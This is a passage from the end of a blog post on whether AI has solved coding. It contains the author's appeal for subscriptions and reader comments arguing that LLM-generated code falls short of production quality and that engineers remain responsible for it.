+
+Could you think of other types of jobs for software engineers?
+
+[Share](https://blog.alexewerlof.com/p/coding-is-not-solved?utm_source=substack&utm_medium=email&utm_content=share&action=share)
+
+*[My monetization strategy](https://blog.alexewerlof.com/i/141786627/q-what-is-your-monetization-strategy) is to give away most content for free but these posts take anywhere from a few hours to a few days to draft, edit, research, illustrate, and publish. I pull these hours from my private time, vacation days and weekends. The simplest way to support this work is to **like**, **subscribe** and **share** it. If you really want to support me lifting our community, you can consider a paid subscription. If you want to save, you can get 20% off via [this link](https://blog.alexewerlof.com/protipsdiscount). As a token of appreciation, subscribers get full access to the Pro-Tips sections and my online book [Reliability Engineering Mindset](https://blog.alexewerlof.com/p/rem). Your contribution also funds my open-source products like [Service Level Calculator](https://slc.alexewerlof.com/). You can also [invite your friends](https://blog.alexewerlof.com/leaderboard) to gain free access or save via a [group subscription](https://blog.alexewerlof.com/subscribe?group=true).*
+
+*And to those of you who already support me, **thank you** for sponsoring this content for the others. 🙌 If you have questions or feedback, or you want me to dig deeper into something, please let me know in the comments.*
+
+I could not put my opinions on AI better than this.
+
+As a casualty of Saaspocalypse, I've landed on running local LLMs for everything from code completion/assistance to the 3 AM "Who would win in a fight between a polar bear and a tiger?" Every now and then I try to generate software without actually handling code myself, and no matter what model or harness I use, no matter how detailed the markdown documents, no matter how thoroughly I appease the machine spirits, I always get about 85% of the way before it falls apart.
+
+No amount of fiddling with levers, managing context, etc., produces anything close to what I'd call production-ready code. At best, you get a pleasantly boring UI suitable for a sales demo on top of a rattling heap of spaghetti: The Sorceror's Apprentice meets "best coding practices". If you're lucky, it mostly works, if you don't use it too much. As you say, if you care more about velocity than quality, it's fine, and that encompasses a good number of use cases. It's just not a replacement for engineers and never will be.
+
+Although, I will say it has inspired my decision to move from engineering to a product/program manager role, so there's that.
+
+I read this article through LLM translation, and I’m also using LLM translation to reply right now. This happens to align with the article’s point (as I see it): you must take responsibility for LLM-generated content. There was an interesting discussion in the Chinese tech community previously; it mentioned that the software industry would later usher in its own Cambrian explosion, but it did not mention another biological event, namely the Ordovician mass extinction. In my view, if software engineers do not take responsibility for the code they run and do not continuously maintain their ability to write code, they are very likely to be eliminated in the visibly approaching “age of mass extinction.” The same applies to software companies: the proliferation of all kinds of software and LLMs will cause the entire software industry to degrade and become oversaturated, and what ultimately remains will most likely be the various kinds of software that still adhere to providing high-quality services and maintaining high availability.
